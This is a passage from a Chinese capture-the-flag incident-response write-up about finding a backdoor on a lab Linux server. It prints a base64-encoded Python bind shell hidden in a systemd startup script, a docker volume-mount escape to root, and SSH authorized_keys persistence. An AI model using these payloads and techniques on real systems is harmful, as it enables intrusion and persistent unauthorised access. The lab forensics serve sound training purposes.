</span></span><span style=display:flex><span>mnt
</span></span><span style=display:flex><span>opt
</span></span><span style=display:flex><span>proc
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>run
</span></span><span style=display:flex><span>sbin
</span></span><span style=display:flex><span>srv
</span></span><span style=display:flex><span>sys
</span></span><span style=display:flex><span>tmp
</span></span><span style=display:flex><span>usr
</span></span><span style=display:flex><span>var
</span></span><span style=display:flex><span>vmlinuz
</span></span><span style=display:flex><span>vmlinuz.old
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>user
</span></span><span style=display:flex><span>pwd
</span></span><span style=display:flex><span>/home/user
</span></span></code></pre></div><pre tabindex=0><code>flag{python38080}
</code></pre><h2 id=q6-6>Q6</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>6、找出开机启动的后门服务名称MD5，提交flag{md5(服务名)}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ systemctl list-unit-files --state<span style=color:#f92672>=</span>enabled
</span></span><span style=display:flex><span>UNIT FILE                              STATE  
</span></span><span style=display:flex><span>apache2.service                        enabled
</span></span><span style=display:flex><span>apparmor.service                       enabled
</span></span><span style=display:flex><span>autovt@.service                        enabled
</span></span><span style=display:flex><span>cloud-config.service                   enabled
</span></span><span style=display:flex><span>cloud-final.service                    enabled
</span></span><span style=display:flex><span>cloud-init-local.service               enabled
</span></span><span style=display:flex><span>cloud-init.service                     enabled
</span></span><span style=display:flex><span>console-setup.service                  enabled
</span></span><span style=display:flex><span>cron.service                           enabled
</span></span><span style=display:flex><span>dbus-org.freedesktop.timesync1.service enabled
</span></span><span style=display:flex><span>docker-compose-app.service             enabled
</span></span><span style=display:flex><span>docker.service                         enabled
</span></span><span style=display:flex><span>getty@.service                         enabled
</span></span><span style=display:flex><span>keyboard-setup.service                 enabled
</span></span><span style=display:flex><span>networking.service                     enabled
</span></span><span style=display:flex><span>rc-local.service                       enabled
</span></span><span style=display:flex><span>rc.local.service                       enabled
</span></span><span style=display:flex><span>rsyslog.service                        enabled
</span></span><span style=display:flex><span>ssh.service                            enabled
</span></span><span style=display:flex><span>sshd.service                           enabled
</span></span><span style=display:flex><span>syslog.service                         enabled
</span></span><span style=display:flex><span>systemd-timesyncd.service              enabled
</span></span><span style=display:flex><span>remote-fs.target                       enabled
</span></span><span style=display:flex><span>apt-daily-upgrade.timer                enabled
</span></span><span style=display:flex><span>apt-daily.timer                        enabled
</span></span><span style=display:flex><span>logrotate.timer                        enabled
</span></span><span style=display:flex><span>man-db.timer                           enabled
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ systemctl cat docker-compose-app.service
</span></span><span style=display:flex><span><span style=color:#75715e># /etc/systemd/system/docker-compose-app.service</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Description<span style=color:#f92672>=</span>Docker Compose Application
</span></span><span style=display:flex><span>After<span style=color:#f92672>=</span>network.target docker.service
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Type<span style=color:#f92672>=</span>simple
</span></span><span style=display:flex><span>WorkingDirectory<span style=color:#f92672>=</span>/home/user/
</span></span><span style=display:flex><span>ExecStart<span style=color:#f92672>=</span>/bin/bash /usr/lib/python3.7/site-packages/docker/startup.sh
</span></span><span style=display:flex><span>ExecStop<span style=color:#f92672>=</span>/usr/bin/docker-compose down
</span></span><span style=display:flex><span>Restart<span style=color:#f92672>=</span>always
</span></span><span style=display:flex><span>User<span style=color:#f92672>=</span>user
</span></span><span style=display:flex><span>TimeoutStartSec<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>TimeoutStopSec<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>KillMode<span style=color:#f92672>=</span>process
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>WantedBy<span style=color:#f92672>=</span>multi-user.target
</span></span></code></pre></div><pre tabindex=0><code>user@ip-10-0-10-10:~$ cat /usr/lib/python3.7/site-packages/docker/startup.sh
#!/bin/bash
/usr/local/bin/docker-compose -f /home/user/nginx/docker-compose.yml up -d

echo &#39;import base64;v=base64.b64decode(&#34;aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwoKIyBDcmVhdGUgc29ja2V0IG9iamVjdApzID0gc29ja2V0LnNvY2tldCgpCnMuYmluZCgoJycsIDgwODApKQpzLmxpc3RlbigxKQoKIyBDb250aW51b3VzbHkgYWNjZXB0IGNvbm5lY3Rpb25zCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQogICAgdHJ5OgogICAgICAgICMgTGF1bmNoIGJhc2ggc2hlbGwgY29ubmVjdGVkIHRvIHRoaXMgc29ja2V0CiAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9iYXNoJ10sIHN0ZGluPWNvbm4sIHN0ZG91dD1jb25uLCBzdGRlcnI9Y29ubikKICAgIGZpbmFsbHk6CiAgICAgICAgIyBFbnN1cmUgdGhlIGNvbm5lY3Rpb24gaXMgY2xvc2VkIGFmdGVyIHVzZQogICAgICAgIGNvbm4uY2xvc2UoKQo=&#34;);exec(v)&#39;|nohup python3 &amp;
</code></pre><p>解码一下是python的shell</p><pre tabindex=0><code>docker-compose-app.service
5213e47de16522f1dc3f9e9ecc0ab8b0
</code></pre><h2 id=q7-5>Q7</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>7、渗透提权获得root目录下的flag
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -perm -4000 -type f -exec ls -la <span style=color:#f92672>{}</span> 2&gt;/dev/null <span style=color:#ae81ff>\;</span>
</span></span></code></pre></div><p>没什么可以利用的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user@ip-10-0-10-10:~$ docker images
</span></span><span style=display:flex><span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
</span></span><span style=display:flex><span>php          fpm       4dcccbe325c2   <span style=color:#ae81ff>6</span> months ago   499MB
</span></span><span style=display:flex><span>nginx        <span style=color:#ae81ff>1</span>         39286ab8a5e1   <span style=color:#ae81ff>6</span> months ago   188MB
</span></span><span style=display:flex><span>user@ip-10-0-10-10:~$ docker run --rm -v /:/host -it nginx:1 /bin/bash
</span></span><span style=display:flex><span>root@8b6ea2a3e225:/# ls /
</span></span><span style=display:flex><span>bin   dev                  docker-entrypoint.sh  home  lib    media  opt   root  sbin  sys  usr
</span></span><span style=display:flex><span>boot  docker-entrypoint.d  etc                   host  lib64  mnt    proc  run   srv   tmp  var
</span></span><span style=display:flex><span>root@8b6ea2a3e225:/# cat flag
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>ATMB_root<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=q8-3>Q8</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>8、黑客3s埋了一个flag在权限维持过程中的地方，可以发现flag{}括号内的首字母是c开头，如flag{cxxxxxxx}
</span></span></code></pre></div><p>用本地写入一共pub进去</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUEJ6VzI2em43MWNUQzZvN29WUjQ1Z0Z4SG1LRjhtcHI3blRWbERlUDFGVUFsME5mTXd5UUlNeUxlVUV4dnc5enR3YjR5VFR1aTNSTC9JT3JTRGFUVEE1djEyZDE4a2d5Yk1FeUlRa0tzaHFoM1BuaUxNckN3V05Rc0FmTnBBM2t2UVNYQmdZNGhmaVkzbzdnL0g2ZktQQ3JTNDA1WlhNT0JDQXg1WjFLQWdidVZhSXJiMVZPYTVnWW5YT05zaHpJMmswNGFQUmt4WTI5QXM2RVA4WnJYN09TalNkamhZTWxKN0Y3NlZpS29IZmRSdXdBcUVrWVpEWFdIWS9KWlFJY3R4K3RkdXJPUjdqamNjck1Tb1BtQ0dXNTZxRXFtSmR5QXcwVG9XZFJUU3RlakVqNS9EbnRxRUcvYzR4ckhaK2E4RTJnR291TlVXZktZc0hKWlU0a20zZnJ0UkFianBzTjRPSUNqVC9IN3l0OUVhOThkNGg2SVkyM3U3Z2wvRXVrMVg3Smt1U0UrTFNFZHczY2t0TWhIZUhaZVpBMXN5eDRGVGFJQ1RmZ3Z3VTRvc3FZaFRKblJwMHEyK2xEbksrY3hDSyt6YWNONnF5bmthRllMdnd2VXk4bjBUR3JkQmpIL20wTktLRHl6VFJRa21UNjZxaWNETlNlVTJWTlIzZU09IG9yYW5nZUBDb3lhbm8K | base64 -d &gt; authorized_keys
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ ssh -i id_rsa root@43.192.32.84 -p <span style=color:#ae81ff>222</span>
</span></span><span style=display:flex><span>Linux ip-10-0-10-10 4.19.0-25-amd64 <span style=color:#75715e>#1 SMP Debian 4.19.289-2 (2023-08-08) x86_64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style=display:flex><span>permitted by applicable law.
</span></span><span style=display:flex><span>Last login: Tue Sep <span style=color:#ae81ff>24</span> 04:58:14 <span style=color:#ae81ff>2024</span> from 192.168.36.20
</span></span><span style=display:flex><span>root@ip-10-0-10-10:~#
</span></span></code></pre></div><p><strong><code>journalctl</code></strong>：</p><ul><li>用于查看系统日志（Systemd 日志）。</li><li>默认显示所有日志条目。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-10:~#  journalctl | grep <span style=color:#e6db74>&#34;cron&#34;</span> | grep flag
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:21:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1424<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:22:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1448<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:23:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1454<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:24:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1456<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:25:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1459<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:26:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1463<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:27:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1465<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:28:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1469<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:29:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1471<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:30:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1478<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:31:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1482<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:32:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1485<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:33:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1487<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:34:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1491<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:35:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1493<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:36:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1495<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:37:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1501<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:38:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1504<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:39:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1508<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:40:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1510<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:41:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1513<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:42:02 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1530<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:43:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1548<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:44:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1555<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:45:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1579<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:46:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1581<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:47:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1586<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:48:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1599<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:49:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1603<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:50:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1610<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:51:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1615<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:52:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1625<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:53:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1628<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:54:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1643<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:55:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1645<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:56:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1652<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:57:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1729<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
